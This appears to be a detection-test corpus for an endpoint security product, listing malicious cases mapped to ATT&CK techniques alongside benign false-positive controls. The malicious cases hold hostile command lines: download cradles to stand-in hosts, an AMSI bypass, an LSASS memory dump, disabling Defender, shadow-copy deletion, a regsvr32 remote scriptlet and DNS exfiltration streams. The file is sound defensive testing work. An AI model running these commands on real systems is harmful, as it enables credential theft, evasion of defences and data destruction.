"""Detection-efficacy corpus — technique-representative inputs + benign controls.

Each case exercises a REAL Valkyrie classifier (no mocks). A malicious case
represents an attacker technique (MITRE ATT&CK id) that SHOULD fire; a benign
case represents ordinary activity that must NOT fire (the false-positive
control). The harness (harness.py) runs every case through the actual
detection code and scores recall + false-positive rate.

HONEST BOUNDARY (read this): these inputs reflect the author's understanding
of each technique. Passing this corpus proves the detection *logic*
discriminates the represented behaviors — it is NOT the same as detonating
live malware in a VM. It cannot reveal blind spots the author didn't think to
write. It is the in-repo measurement instrument; live-sample lab testing (the
Atomic Red Team / real-beacon path) remains the gold standard this complements.
"""

from __future__ import annotations

from dataclasses import dataclass, field


@dataclass(frozen=True)
class Case:
    id: str
    detector: str          # cmdline | powershell | persistence | entropy | intel_domain |
                           # intel_ip | scanner | sysmon | wmi | process | network | dga
    malicious: bool        # True = should fire; False = benign control (must not fire)
    technique: str = ""    # MITRE ATT&CK id (malicious cases)
    tactic: str = ""
    inp: object = ""       # detector-specific input (str, tuple, or bytes)
    note: str = ""


# ── Malicious cases (should fire) ──────────────────────────────────────────
MALICIOUS: list[Case] = [
    # Command-line execution heuristics (process_telemetry.classify_cmdline)
    Case("ps-enc", "cmdline", True, "T1027", "defense-evasion",
         ("powershell.exe",
          "powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUA"),
         "encoded PowerShell"),
    Case("ps-downloadstring", "cmdline", True, "T1105", "command-and-control",
         ("powershell.exe",
          "powershell iex (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"),
         "download cradle"),
    Case("hidden-window", "cmdline", True, "T1564.003", "defense-evasion",
         ("wscript.exe", "wscript //b //nologo evil.vbs"),
         "hidden/non-interactive flags"),
    Case("frombase64", "cmdline", True, "T1140", "defense-evasion",
         ("powershell.exe",
          "powershell -c \"iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($e)))\""),
         "base64 decode+execute"),

    # PowerShell script-block heuristics (etw/powershell.classify_powershell)
    Case("ps-amsi-bypass", "powershell", True, "T1562.001", "defense-evasion",
         "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
         ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
         "AMSI bypass"),
    Case("ps-download-cradle", "powershell", True, "T1105", "command-and-control",
         "IEX (New-Object Net.WebClient).DownloadString('http://evil/payload')",
         "download cradle in script"),
    Case("ps-lsass", "powershell", True, "T1003.001", "credential-access",
         "rundll32 comsvcs.dll MiniDump 640 C:\\temp\\lsass.dmp full",
         "LSASS credential dump"),
    Case("ps-defender-off", "powershell", True, "T1562.001", "defense-evasion",
         "Set-MpPreference -DisableRealtimeMonitoring $true",
         "disable Defender"),
    Case("ps-inject", "powershell", True, "T1055", "defense-evasion",
         "$h=VirtualAlloc 0 0x1000 0x3000 0x40; [Runtime.InteropServices.Marshal]"
         "::Copy($sc,0,$h,$sc.Length); CreateThread 0 0 $h 0 0 0",
         "process injection primitives"),

    # Persistence (ASEP) — malicious auto-starts escalate to high
    Case("run-key-temp", "persistence", True, "T1547.001", "persistence",
         ("registry_run", "C:\\Users\\v\\AppData\\Local\\Temp\\svchost.exe"),
         "Run key from temp dir"),
    Case("run-key-encoded", "persistence", True, "T1547.001", "persistence",
         ("registry_run", "powershell -enc SQBFAFgA..."),
         "Run key with encoded payload"),

    # Ransomware — encrypted-content entropy (ransomware_shield.shannon_entropy)
    Case("entropy-encrypted", "entropy", True, "T1486", "impact",
         b"", "high-entropy (encrypted) blob"),   # inp filled by harness generator

    # Threat-intel IOC matching (threat_intel)
    Case("intel-c2-domain", "intel_domain", True, "T1071", "command-and-control",
         "evil-c2.example", "known malware-distribution domain"),
    Case("intel-c2-subdomain", "intel_domain", True, "T1071", "command-and-control",
         "cdn.assets.evil-c2.example", "subdomain of known-bad parent"),
    Case("intel-c2-ip", "intel_ip", True, "T1071", "command-and-control",
         "45.9.148.99", "known C2 IP"),

    # Tracker/ad infrastructure (site_scanner) — privacy detection
    Case("tracker-doubleclick", "scanner", True, "T1071", "command-and-control",
         "doubleclick.net", "known ad-tech tracker"),

    # ── DNS tunnelling / exfil (site_scanner S8/S9 + dns_tunnel.py) ──────────
    # inp = a STREAM of hostnames (tunnelling is an aggregate shape). These
    # pin the exact miss that let an Atomic Red Team DNS burst through as
    # "allowed" before the flood/wildcard-provider signals existed.
    Case("tunnel-art-nipio", "tunnel", True, "T1048.003", "exfiltration",
         tuple(f"atomicredteam-{n}.127.0.0.1.nip.io"
               for n in (703907, 435169, 339451, 583611, 478539, 636933)),
         "Atomic Red Team DNS burst over nip.io wildcard provider"),
    Case("tunnel-exfil-hex", "tunnel", True, "T1048.003", "exfiltration",
         tuple(f"{chunk}.tunnel.evil-exfil.example"
               for chunk in ("4d5a90000300", "0000000400000f", "ffff0000b800",
                             "0000000040001a", "0000000000e01f", "ba0e00b409cd")),
         "hex-encoded payload chunks streamed as subdomains"),
    Case("tunnel-b64-stream", "tunnel", True, "T1048.003", "exfiltration",
         tuple(f"{chunk}.dnscat.evil-c2.example"
               for chunk in ("aGVsbG8wd29ybGQx", "c2VjcmV0ZGF0YTk5", "ZXhmaWx0cmF0aW9u",
                             "bW9yZWRhdGFoZXJl", "ZmluYWxjaHVua3oz", "dGhlbGFzdG9uZTQ0")),
         "base64 DNS tunnel (dnscat-style)"),

    # ── Behavioral IOA rules (behavioral_rules.py) ─ representative sample;
    #    the exhaustive per-rule + benign-control coverage is in
    #    tests/test_behavioral_rules.py. inp = (image, parent, cmdline, path).
    Case("beh-comsvcs-lsass", "behavior", True, "T1003.001", "credential-access",
         ("rundll32.exe", "cmd.exe",
          "rundll32 comsvcs.dll MiniDump 640 c:\\lsass.dmp full", ""),
         "LSASS dump via comsvcs MiniDump"),
    Case("beh-vssadmin", "behavior", True, "T1490", "impact",
         ("vssadmin.exe", "cmd.exe", "vssadmin delete shadows /all /quiet", ""),
         "shadow-copy deletion (ransomware precursor)"),
    Case("beh-squiblydoo", "behavior", True, "T1218.010", "defense-evasion",
         ("regsvr32.exe", "cmd.exe",
          "regsvr32 /s /u /i:https://evil/x.sct scrobj.dll", ""),
         "regsvr32 remote scriptlet (Squiblydoo)"),
    Case("beh-defender-off", "behavior", True, "T1562.001", "defense-evasion",
         ("powershell.exe", "cmd.exe",
          "Set-MpPreference -DisableRealtimeMonitoring $true", ""),
         "Defender real-time protection disabled"),
    Case("beh-office-shell", "behavior", True, "T1059", "execution",
         ("powershell.exe", "winword.exe", "powershell -nop -w hidden", ""),
         "Office spawned a hidden PowerShell"),

    # ── Multi-stage kill-chain correlation (edr/killchain.py) ───────────────
    # inp = (actor, [(technique, title), ...]) — a sequence on ONE process.
    # These pin the correlation win: the base same-category correlator would
    # leave these as scattered single-tactic incidents; the chain correlator
    # escalates them to one multi-stage attack. Tactic = the chain's endpoint.
    Case("chain-full-intrusion", "killchain", True, "T1071.004", "command-and-control",
         ("powershell.exe", [
             ("T1059.001", "encoded PowerShell"),      # execution
             ("T1105", "download cradle"),             # C2 (ingress tool transfer)
             ("T1071.004", "DNS beacon"),              # C2
             ("T1547.001", "registry Run key"),        # persistence
             ("T1003.001", "LSASS access")]),          # credential-access
         "execution → C2 → persistence → cred-access on one process"),
    Case("chain-ransomware-run", "killchain", True, "T1486", "impact",
         ("wscript.exe", [
             ("T1059", "script exec"),                 # execution
             ("T1562.001", "disable defenses"),        # defense-evasion
             ("T1486", "mass file encryption")]),      # impact
         "execution → defense-evasion → impact (ransomware chain)"),

    # ── ETW Sysmon sensor classification (etw/sysmon.classify_sysmon) ───────
    # Each case is (Sysmon EventID, EventData dict) — the same shape the real
    # sensor parses from Microsoft-Windows-Sysmon/Operational XML.
    Case("sysmon-inject", "sysmon", True, "T1055", "defense-evasion",
         (8, {"SourceImage": r"C:\Users\v\AppData\Local\Temp\loader.exe",
              "TargetImage": r"C:\Windows\System32\svchost.exe",
              "SourceProcessId": "4100", "TargetProcessId": "820",
              "StartModule": "", "StartFunction": ""}),
         "CreateRemoteThread injection (EID 8)"),
    Case("sysmon-lsass", "sysmon", True, "T1003.001", "credential-access",
         (10, {"SourceImage": r"C:\Users\v\AppData\Local\Temp\mimi.exe",
               "TargetImage": r"C:\Windows\System32\lsass.exe",
               "GrantedAccess": "0x1010",
               "SourceProcessId": "5120", "TargetProcessId": "640"}),
         "LSASS credential read (EID 10)"),
    Case("sysmon-tamper", "sysmon", True, "T1055.012", "defense-evasion",
         (25, {"Image": r"C:\Users\v\AppData\Local\Temp\hollow.exe",
               "Type": "Image is replaced", "ProcessId": "6200"}),
         "process hollowing / tampering (EID 25)"),
    Case("sysmon-unsigned-mod", "sysmon", True, "T1574", "defense-evasion",
         (7, {"Image": r"C:\Program Files\App\app.exe",
              "ImageLoaded": r"C:\Users\v\AppData\Local\Temp\evil.dll",
              "SignatureStatus": "Unavailable", "Signed": "false",
              "Hashes": "SHA256=DEADBEEF", "ProcessId": "3300"}),
         "unsigned module load / DLL hijack (EID 7)"),
    Case("sysmon-runkey", "sysmon", True, "T1547.001", "persistence",
         (13, {"Image": r"C:\Users\v\AppData\Local\Temp\dropper.exe",
               "TargetObject": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater",
               "Details": r"C:\Users\v\AppData\Local\Temp\payload.exe",
               "ProcessId": "3300"}),
         "autorun registry write (EID 13)"),
    Case("sysmon-startup-drop", "sysmon", True, "T1547.001", "persistence",
         (11, {"Image": r"C:\Users\v\AppData\Local\Temp\dropper.exe",
               "TargetFilename": r"C:\Users\v\AppData\Roaming\Microsoft\Windows"
                                 r"\Start Menu\Programs\Startup\run.vbs",
               "ProcessId": "3300"}),
         "file dropped in Startup folder (EID 11)"),

    # ── WMI event-subscription persistence (etw/wmi.classify_wmi) ───────────
    Case("wmi-activescript", "wmi", True, "T1546.003", "persistence",
         "__FilterToConsumerBinding ActiveScriptEventConsumer "
         "ScriptText=\"CreateObject(\\\"WScript.Shell\\\").Run payload\" "
         "__InstanceModificationEvent WITHIN 60 Win32_LocalTime",
         "ActiveScript WMI consumer (fileless persistence)"),
    Case("wmi-cmdline", "wmi", True, "T1546.003", "persistence",
         "__FilterToConsumerBinding CommandLineEventConsumer "
         "CommandLineTemplate=\"powershell -nop -w hidden -enc SQBFAFgA\"",
         "CommandLine WMI consumer with encoded payload"),

    # ── Process-relationship heuristics (process_telemetry.classify_process) ─
    Case("proc-office-shell", "process", True, "T1204.002", "execution",
         ("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
          "winword.exe"),
         "Office document spawned a shell (macro execution)"),
    Case("proc-lolbin-temp", "process", True, "T1218", "defense-evasion",
         ("rundll32.exe", r"C:\Users\v\AppData\Local\Temp\a.exe", "explorer.exe"),
         "LOLBin executed from a temp directory"),

    # ── Network connection to threat-intel IP (network_telemetry) ──────────
    # DNS misses hard-coded-IP C2; the network collector + intel is the seam.
    Case("net-c2-ip", "network", True, "T1071", "command-and-control",
         ("45.9.148.99", 443), "outbound connection to known C2 IP"),

    # ── DGA C2 domains (dga.classify_dga → scanner block) ──────────────────
    # Algorithmic malware rendezvous domains — the blind spot ADR 0023 measured
    # and this cycle closed. Long-label PRNG style (the target family class).
    Case("dga-necurs", "dga", True, "T1568.002", "command-and-control",
         "xjkqvw92hd8skwlqz3ty.com", "PRNG-style DGA registrable label"),
    Case("dga-ramnit", "dga", True, "T1568.002", "command-and-control",
         "myfpbcadkbfcdcj.com", "consonant-heavy DGA label"),
    Case("dga-digits", "dga", True, "T1568.002", "command-and-control",
         "k2v9q3xw8pjh4m1tzr7f.top", "DGA label with interleaved digits"),
]


# ── Benign cases (must NOT fire) — the false-positive control set ───────────
BENIGN: list[Case] = [
    Case("b-normal-ps", "cmdline", False, inp=(
        "powershell.exe", "powershell Get-ChildItem C:\\Projects -Recurse"),
        note="ordinary PowerShell dev command"),
    Case("b-git", "cmdline", False, inp=(
        "git.exe", "git commit -m \"fix: resolve race in writer thread\""),
        note="developer git commit"),
    Case("b-npm", "cmdline", False, inp=(
        "node.exe", "node C:\\app\\server.js --port 8080"),
        note="node server launch"),
    Case("b-installer", "cmdline", False, inp=(
        "msiexec.exe", "msiexec /i C:\\Downloads\\App-Setup.msi /quiet"),
        note="silent installer (quiet != hidden malware flags)"),
    Case("b-ps-module", "powershell", False, inp=(
        "Import-Module Az.Accounts; Connect-AzAccount -Identity"),
        note="legitimate Azure module use"),
    Case("b-ps-loop", "powershell", False, inp=(
        "foreach ($f in Get-ChildItem *.log) { Select-String 'ERROR' $f }"),
        note="log-scanning script"),
    Case("b-run-key-app", "persistence", False, inp=(
        "registry_run", "C:\\Program Files\\Spotify\\Spotify.exe --autostart"),
        note="normal app auto-start (notable=medium, not high)"),
    Case("b-run-key-onedrive", "persistence", False, inp=(
        "registry_run", "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe /background"),
        note="OneDrive auto-start"),
    Case("b-entropy-text", "entropy", False, inp=(
        b"Dear team, please find attached the Q3 report. Regards, Alex.\n" * 40),
        note="normal document text (low entropy)"),
    Case("b-entropy-json", "entropy", False, inp=(
        b'{"user":"alex","roles":["admin","dev"],"active":true}\n' * 40),
        note="structured JSON (low-moderate entropy)"),
    Case("b-clean-domain", "intel_domain", False, inp="github.com",
         note="legitimate domain, not in feeds"),
    Case("b-clean-domain2", "intel_domain", False, inp="microsoft.com",
         note="legitimate domain"),
    Case("b-clean-ip", "intel_ip", False, inp="140.82.112.3",
         note="legitimate IP (GitHub), not in feeds"),
    Case("b-scanner-news", "scanner", False, inp="wikipedia.org",
         note="ordinary site, must load"),
    Case("b-scanner-bank", "scanner", False, inp="chase.com",
         note="bank site, must never be blocked"),
    Case("b-scanner-unknown", "scanner", False, inp="some-small-blog-42.dev",
         note="unknown site — default allow"),

    # DNS-tunnel FALSE-POSITIVE controls — legitimate high-fan-out subdomain
    # traffic that must NOT be flagged as a tunnel. The cost of a miss here is
    # broken video / storage / dev tooling for the user.
    Case("b-tunnel-googlevideo", "tunnel", False,
         inp=tuple(f"rr{i}---sn-4g5e6nsz{i}.googlevideo.com" for i in range(8)),
         note="YouTube video shard fan-out (exempt CDN root)"),
    Case("b-tunnel-cdn-shards", "tunnel", False,
         inp=tuple(f"d{i}abc{i}xyz.cloudfront.net" for i in range(8)),
         note="CloudFront distribution hostnames (exempt CDN root)"),
    Case("b-tunnel-normal-web", "tunnel", False,
         inp=("www.github.com", "api.github.com", "avatars.githubusercontent.com",
              "codeload.github.com", "docs.github.com"),
         note="ordinary multi-service site — common labels, no flood"),
    Case("b-tunnel-nipio-dev", "tunnel", False,
         inp=("myapp.127.0.0.1.nip.io", "myapp.127.0.0.1.nip.io"),
         note="legit local dev over nip.io — flagged at most, never blocked"),

    # Behavioral-rule FALSE-POSITIVE controls — ordinary admin/user commands.
    Case("b-beh-reg-query", "behavior", False,
         inp=("reg.exe", "cmd.exe", "reg query hklm\\software", ""),
         note="reg query (read) — not add/save"),
    Case("b-beh-sc-query", "behavior", False,
         inp=("sc.exe", "cmd.exe", "sc query windefend", ""),
         note="service query — not create"),
    Case("b-beh-certutil-hash", "behavior", False,
         inp=("certutil.exe", "cmd.exe", "certutil -hashfile a.exe sha256", ""),
         note="file hashing — not download/decode"),
    Case("b-beh-net-view", "behavior", False,
         inp=("net.exe", "cmd.exe", "net view", ""),
         note="network view — not user /add"),

    # Kill-chain FALSE-POSITIVE controls — must NOT raise a multi-stage chain.
    Case("b-chain-single-tactic", "killchain", False,
         inp=("chrome.exe", [
             ("T1071", "https"), ("T1071.004", "dns"), ("T1105", "update download")]),
         note="one actor, all Command-and-Control — a single tactic is not a chain"),
    Case("b-chain-admin-ps", "killchain", False,
         inp=("powershell.exe", [
             ("T1059.001", "admin script"), ("T1059", "another cmd")]),
         note="ordinary admin PowerShell — repeated Execution only, no second tactic"),

    # Sysmon benign controls — ordinary endpoint activity must not fire.
    Case("b-sysmon-signed-proc", "sysmon", False, inp=(
        1, {"Image": r"C:\Windows\System32\notepad.exe",
            "ParentImage": r"C:\Windows\explorer.exe", "ProcessId": "1200"}),
        note="signed system process from a normal parent (EID 1)"),
    Case("b-sysmon-signed-mod", "sysmon", False, inp=(
        7, {"Image": r"C:\Program Files\App\app.exe",
            "ImageLoaded": r"C:\Windows\System32\kernel32.dll",
            "SignatureStatus": "Valid", "Signed": "true", "ProcessId": "1200"}),
        note="validly-signed module load (EID 7)"),
    Case("b-sysmon-nonlsass", "sysmon", False, inp=(
        10, {"SourceImage": r"C:\Program Files\Tool\tool.exe",
             "TargetImage": r"C:\Windows\System32\svchost.exe",
             "GrantedAccess": "0x1010", "SourceProcessId": "1200",
             "TargetProcessId": "800"}),
        note="process access to a non-LSASS target (EID 10)"),
    Case("b-sysmon-nonautorun-reg", "sysmon", False, inp=(
        13, {"Image": r"C:\Program Files\App\app.exe",
             "TargetObject": r"HKCU\Software\App\Settings\Theme",
             "Details": "dark", "ProcessId": "1200"}),
        note="registry write outside autorun keys (EID 13)"),
    Case("b-sysmon-conn", "sysmon", False, inp=(
        3, {"Image": r"C:\Program Files\Google\Chrome\chrome.exe",
            "DestinationIp": "140.82.112.3", "DestinationPort": "443",
            "Initiated": "true", "ProcessId": "1200"}),
        note="ordinary outbound HTTPS connection (EID 3) — info, not a threat"),

    # WMI benign control — a non-persistence provider event must not fire.
    Case("b-wmi-provider", "wmi", False, inp=(
        "Win32_Process provider started; ESS query executed normally"),
        note="benign WMI provider activity (no consumer binding)"),

    # Process benign controls — normal signed apps must not fire.
    Case("b-proc-chrome", "process", False, inp=(
        "chrome.exe", r"C:\Program Files\Google\Chrome\chrome.exe", "explorer.exe"),
        note="browser launched from Program Files"),
    Case("b-proc-svchost", "process", False, inp=(
        "svchost.exe", r"C:\Windows\System32\svchost.exe", "services.exe"),
        note="service host from System32"),

    # Network benign control — connection to a clean public IP must not fire.
    Case("b-net-public-ip", "network", False, inp=("140.82.112.3", 443),
         note="outbound to a legitimate IP (GitHub), not in intel feeds"),

    # DGA benign controls — the hard cases a naive entropy detector breaks on.
    Case("b-dga-cdn", "dga", False, inp="d1anzknqnc1kmb.cloudfront.net",
         note="gibberish CDN SUBDOMAIN under a real parent — must not fire"),
    Case("b-dga-longword", "dga", False, inp="nationalgeographic.com",
         note="long dictionary domain (len>=12) — must not fire"),
    Case("b-dga-hyphen", "dga", False, inp="real-estate-services.com",
         note="hyphenated legitimate brand — hyphens must not inflate score"),
    Case("b-dga-brand", "dga", False, inp="crunchyroll.com",
         note="consonant-heavy real brand — must not fire"),
]
